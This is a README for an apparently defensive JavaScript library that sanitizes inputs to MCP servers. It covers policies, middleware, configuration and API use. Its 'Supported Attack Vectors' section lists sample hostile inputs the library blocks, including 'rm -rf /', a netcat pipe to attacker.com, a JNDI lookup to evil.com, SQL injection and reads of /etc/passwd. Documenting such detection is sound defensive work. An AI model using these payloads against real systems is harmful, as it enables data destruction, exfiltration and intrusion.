# MCP Sanitizer

A comprehensive security sanitization library for Model Context Protocol (MCP) servers, designed to prevent common attack vectors including command injection, SQL injection, directory traversal, prototype pollution, and code execution attempts.

[![npm version](https://badge.fury.io/js/mcp-sanitizer.svg)](https://badge.fury.io/js/mcp-sanitizer)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

## Features

- **Multi-layered Protection**: Guards against command injection, SQL injection, XSS, prototype pollution, and template injection
- **Context-aware Sanitization**: Different validation rules for file paths, URLs, commands, and SQL queries
- **Trusted Security Libraries**: Built on industry-standard libraries like `escape-html`, `sqlstring`, `shell-quote`, `validator`, `sanitize-filename`, and `path-is-inside`
- **Framework Integration**: Ready-to-use middleware for Express, Fastify, and Koa
- **Security Policies**: Pre-configured policies (STRICT, MODERATE, PERMISSIVE, DEVELOPMENT, PRODUCTION)
- **Configurable & Extensible**: Fluent API and comprehensive configuration options
- **High Performance**: Sub-millisecond operations with optional caching
- **Comprehensive Testing**: 116+ tests covering attack vectors and edge cases

## Installation

```bash
npm install mcp-sanitizer
```

## Quick Start

```javascript
const MCPSanitizer = require('mcp-sanitizer');

// Use default configuration
const sanitizer = new MCPSanitizer();

// Or use a security policy
const strictSanitizer = new MCPSanitizer('STRICT');

// Sanitize MCP tool call
const toolCall = {
  name: "file_reader",
  parameters: {
    file_path: "../../../etc/passwd"  // Malicious input
  }
};

const result = sanitizer.sanitize(toolCall);
if (result.blocked) {
  console.log('Attack blocked:', result.warnings);
} else {
  console.log('Safe input:', result.sanitized);
}
```

## Security Policies

The MCP Sanitizer includes five pre-configured security policies:

| Policy | Use Case | String Limit | Protocols | Blocking Level |
|--------|----------|--------------|-----------|----------------|
| **STRICT** | High-security, untrusted input | 1,000 chars | HTTPS only | Medium+ |
| **MODERATE** | Balanced production security | 5,000 chars | HTTP, HTTPS, MCP | High+ |
| **PERMISSIVE** | Trusted environments | 50,000 chars | HTTP, HTTPS, FTP, MCP, File | Critical only |
| **DEVELOPMENT** | Development with debugging | 20,000 chars | HTTP, HTTPS, MCP, File | High+ |
| **PRODUCTION** | Production environments | 8,000 chars | HTTPS, MCP | High+ |

```javascript
// Use a security policy
const sanitizer = new MCPSanitizer('PRODUCTION');

// Use policy with customizations
const customSanitizer = new MCPSanitizer({
  policy: 'MODERATE',
  maxStringLength: 15000,
  allowedProtocols: ['https', 'mcp']
});
```

## Framework Middleware

### Express.js

```javascript
const express = require('express');
const { createMCPMiddleware } = require('mcp-sanitizer');

const app = express();
app.use(express.json());

// Auto-detect framework and apply middleware
app.use(createMCPMiddleware());

// Or specify configuration
app.use(createMCPMiddleware({
  policy: 'PRODUCTION',
  mode: 'sanitize', // or 'block'
  skipPaths: ['/health', '/metrics']
}));

app.post('/tools/:toolName/execute', (req, res) => {
  // req.body is now sanitized
  // req.sanitizationWarnings contains any warnings
});
```

### Fastify

```javascript
const fastify = require('fastify')();
const { createFastifyPlugin } = require('mcp-sanitizer');

// Register as plugin
fastify.register(createFastifyPlugin({
  policy: 'MODERATE'
}));
```

### Koa

```javascript
const Koa = require('koa');
const { createKoaMiddleware } = require('mcp-sanitizer');

const app = new Koa();
app.use(createKoaMiddleware({
  policy: 'STRICT'
}));
```

## Configuration Options

### Using Configuration Builder (Fluent API)

```javascript
const { createConfigBuilder } = require('mcp-sanitizer');

const config = createConfigBuilder()
  .usePolicy('MODERATE')
  .maxStringLength(20000)
  .allowProtocols(['https', 'mcp'])
  .allowFileExtensions(['.txt', '.json', '.md', '.csv'])
  .blockOnSeverity('high')
  .strictMode(true)
  .patternDetection({
    enableCommandInjection: true,
    enableSQLInjection: true,
    enablePrototypePollution: true,
    enableTemplateInjection: false
  })
  .build();

const sanitizer = new MCPSanitizer(config);
```

### Direct Configuration

```javascript
const sanitizer = new MCPSanitizer({
  // Limits
  maxStringLength: 10000,
  maxDepth: 10,
  maxArrayLength: 1000,
  maxObjectKeys: 100,
  
  // Security
  allowedProtocols: ['https', 'mcp'],
  allowedFileExtensions: ['.txt', '.json', '.md'],
  blockOnSeverity: 'high',
  strictMode: false,
  
  // Patterns
  blockedPatterns: [
    /\$\{.*?\}/g,     // Template injection
    /__proto__/gi,    // Prototype pollution
    /require\s*\(/gi  // Code execution
  ],
  
  // Context-specific settings
  contextSettings: {
    url: {
      allowPrivateIPs: false,
      allowLocalhostWithoutPort: false
    },
    filePath: {
      allowAbsolutePaths: false,
      allowedDirectories: ['./data']
    }
  }
});
```

## Supported Attack Vectors

### Directory Traversal
- `../../../etc/passwd`
- `..\\windows\\system32\\config`
- `/proc/version`, `/sys/class/net`

### Command Injection
- `ls; rm -rf /`
- `command && malicious_command`
- `ls | nc attacker.com 4444`

### SQL Injection
- `'; DROP TABLE users;--`
- `UNION SELECT * FROM passwords`
- `EXEC xp_cmdshell('dir')`

### Prototype Pollution
- `{"__proto__": {"isAdmin": true}}`
- `{"constructor": {"prototype": {"polluted": true}}}`

### Template Injection
- `{{constructor.constructor('return process')()}}`
- `${jndi:ldap://evil.com/x}`
- `<%= require("child_process").exec("whoami") %>`

### Code Execution
- `require('fs').readFileSync('/etc/passwd')`
- `eval("malicious_code")`
- `Function("return process")()`

## API Reference

### `new MCPSanitizer(options?)`

Create a new sanitizer instance.

**Parameters:**
- `options`: Configuration object, security policy name, or policy with customizations

### `sanitizer.sanitize(input, context?)`

Sanitizes input data and returns a result object.

**Parameters:**
- `input`: The data to sanitize (any type)
- `context`: Optional context object with `type` field

**Returns:**
```javascript
{
  sanitized: any,     // Sanitized data (null if blocked)
  warnings: string[], // Array of warning messages
  blocked: boolean    // True if input was blocked
}
```

**Context Types:**
- `file_path`: Apply file path validation
- `url`: Apply URL validation  
- `command`: Apply command validation
- `sql`: Apply SQL query validation

### Specialized Methods

```javascript
// Sanitize specific input types
sanitizer.sanitizeFilePath('/path/to/file');
sanitizer.sanitizeURL('https://example.com');
sanitizer.sanitizeCommand('ls -la');
sanitizer.sanitizeSQL('SELECT * FROM users WHERE id = ?');
```

### Configuration Methods

```javascript
// Get configuration summary
const summary = sanitizer.getConfigSummary();

// Update configuration at runtime
sanitizer.updateConfig({
  maxStringLength: 25000
});

// Apply new security policy
sanitizer.applyPolicy('STRICT', {
  maxStringLength: 5000 // Override
});

// Check environment compatibility
const compatibility = sanitizer.checkEnvironmentCompatibility('production');
```

## Security Libraries Used

The MCP Sanitizer leverages trusted, industry-standard security libraries:

- **[escape-html](https://github.com/component/escape-html)** - HTML entity encoding (3-4x faster than regex)
- **[sqlstring](https://github.com/mysqljs/sqlstring)** - MySQL-compatible SQL escaping
- **[shell-quote](https://github.com/substack/node-shell-quote)** - Shell command escaping
- **[validator](https://github.com/validatorjs/validator.js)** - String validation and sanitization
- **[sanitize-filename](https://github.com/parshap/node-sanitize-filename)** - Filename sanitization
- **[path-is-inside](https://github.com/domenic/path-is-inside)** - Path containment checking

## Testing

```bash
# Run tests
npm test

# Run with coverage
npm run test:coverage

# Watch mode
npm run test:watch

# Security audit
npm run security-audit
```

## Performance

- **Low Latency**: All operations complete in <0.5ms
- **Memory Efficient**: Configurable limits prevent memory exhaustion
- **Scalable**: Stateless design allows horizontal scaling
- **Optimized**: Using C++ backed libraries where available

## Examples

### Environment-based Configuration

```javascript
const { createRecommendedConfig } = require('mcp-sanitizer');

// Get recommended configuration for your environment
const { config, metadata } = createRecommendedConfig('production', 'low');
console.log(metadata.rationale); // Why this policy was recommended

const sanitizer = new MCPSanitizer(config);
```

### Custom Security Patterns

```javascript
const sanitizer = new MCPSanitizer({
  blockedPatterns: [
    // Default patterns plus custom ones
    /bitcoin|cryptocurrency/i,  // Block crypto content
    /\b\d{16}\b/,              // Block credit card numbers
    /password|secret|token/i    // Block sensitive keywords
  ],
  sqlKeywords: [
    // Add custom SQL keywords
    'MERGE', 'UPSERT', 'BULK'
  ]
});
```

### MCP Tool Parameter Validation

```javascript
// Before executing file operations
const pathResult = sanitizer.sanitize(params.file_path, { type: 'file_path' });
if (pathResult.blocked) {
  throw new Error('Invalid file path');
}

// Before making HTTP requests
const urlResult = sanitizer.sanitize(params.url, { type: 'url' });
if (urlResult.blocked) {
  throw new Error('Invalid or restricted URL');
}
```

## Security Considerations

- **Defense in Depth**: Use sanitization as one layer of your security strategy
- **Input Validation**: Always validate inputs at the edge of your system
- **Output Encoding**: Consider output context when displaying sanitized data
- **Rate Limiting**: Implement rate limiting alongside input sanitization
- **Logging**: Log blocked attempts for security monitoring
- **Regular Updates**: Keep the library updated for new attack patterns

## Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Write tests for new functionality
4. Ensure all tests pass (`npm test`)
5. Lint your code (`npm run lint`)
6. Commit your changes (`git commit -m 'Add amazing feature'`)
7. Push to the branch (`git push origin feature/amazing-feature`)
8. Open a Pull Request

## Security Reporting

If you discover a security vulnerability, please email me instead of using the public issue tracker.

## License

MIT License - see [LICENSE](LICENSE) file for details.

## Changelog

### v1.0.0
- Initial release with comprehensive security features
- Integrated trusted security libraries (escape-html, sqlstring, shell-quote, validator, sanitize-filename, path-is-inside)
- Pre-configured security policies (STRICT, MODERATE, PERMISSIVE, DEVELOPMENT, PRODUCTION)
- Middleware support for Express, Fastify, and Koa
- Fluent configuration builder API
- High performance (sub-millisecond operations)
- Comprehensive test suite (116+ tests)
- Support for all major attack vector prevention

## Related Projects

- [Model Context Protocol](https://github.com/anthropics/model-context-protocol)
- [OWASP Input Validation](https://owasp.org/www-project-proactive-controls/v3/en/c5-validate-inputs)
- [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)

---

Built with ❤️ for the MCP community. Secured with industry-standard libraries.